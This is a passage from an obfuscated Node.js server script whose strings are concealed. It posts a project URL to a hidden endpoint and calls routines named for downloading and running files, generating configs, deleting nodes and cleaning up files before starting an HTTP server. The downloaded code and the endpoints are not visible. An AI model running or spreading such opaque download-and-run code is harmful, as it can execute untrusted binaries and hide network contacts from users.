_0x4f6a9b=_0x43bb93;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4f6a9b(0xa8)](_0x4f6a9b(0xb3));return;}try{const _0x28afcc=await axios[_0x4f6a9b(0x13b)](_0x4f6a9b(0xa9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4f6a9b(0x105)}});return console[_0x4f6a9b(0xa8)](_0x4f6a9b(0x12a)),_0x28afcc;}catch(_0x6693b4){return console[_0x4f6a9b(0x148)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x6693b4[_0x4f6a9b(0x10d)]),null;}}async function startserver(){const _0x3e1687=_0x43bb93;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1504c5){console[_0x3e1687(0x148)](_0x3e1687(0xd9),_0x1504c5);}}startserver()[_0x43bb93(0x15b)](_0x430eee=>{const _0x31e887=_0x43bb93;console[_0x31e887(0x148)]('Unhandled\x20error\x20in\x20startserver:',_0x430eee);}),app[_0x43bb93(0xe5)](PORT,()=>console[_0x43bb93(0xa8)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
